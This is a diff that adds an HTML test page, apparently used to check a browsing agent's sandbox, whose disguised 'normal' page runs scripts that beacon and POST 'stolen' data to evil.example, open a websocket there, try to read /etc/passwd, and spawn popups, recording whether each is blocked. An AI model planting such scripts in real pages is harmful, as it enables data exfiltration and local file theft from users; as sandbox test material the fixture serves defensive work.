@@ -1,0 +1,31 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Totally normal page</title></head>
+<body>
+<h1>Totally normal page</h1>
+<p>Nothing to see here.</p>
+<pre id="result">pending</pre>
+<script>
+// Hostile page: every probe tries to get data out or reach something it should not.
+// Results are written into the DOM so the agent can read them with `extract`.
+const R = {};
+const limit = (p, ms = 3500) => Promise.race([p, new Promise(r => setTimeout(() => r("TIMEOUT"), ms))]);
+async function probe(name, fn) {
+  try { const v = await limit(fn()); R[name] = v === "TIMEOUT" ? "TIMEOUT" : "REACHED:" + v; }
+  catch (e) { R[name] = "BLOCKED:" + ((e && e.name) || "error"); }
+}
+(async () => {
+  // plain-HTTP beacon: fire and forget. A proxy 403 looks like an opaque response to the page,
+  // so this one is judged from the egress ledger, not from the page.
+  try { fetch("http://evil.example/plain-beacon", {mode: "no-cors"}).catch(() => {}); } catch (e) {}
+  await Promise.all([
+    probe("fetch_evil_https", () => fetch("https://evil.example/collect", {method: "POST", mode: "no-cors", body: "stolen=1"}).then(r => r.type)),
+    probe("websocket_evil", () => new Promise((res, rej) => { const w = new WebSocket("wss://evil.example/ws"); w.onopen = () => res("open"); w.onerror = () => rej(new Error("ws")); })),
+    probe("xhr_file", () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", "file:///etc/passwd"); x.onload = () => res(x.responseText.slice(0, 20)); x.onerror = () => rej(new Error("xhr")); x.send(); })),
+  ]);
+  let opened = 0;
+  for (let i = 0; i < 3; i++) { try { if (window.open("https://evil.example/popup" + i)) opened++; } catch (e) {} }
+  R.popups_opened = opened;
+  try { alert("you have been pwned"); R.alert = "dismissed"; } catch (e) { R.alert = "error"; }
+  document.getElementById("result").textContent = "BROWSER_RESULT " + JSON.stringify(R);
+})();
+</script>
+</body></html>
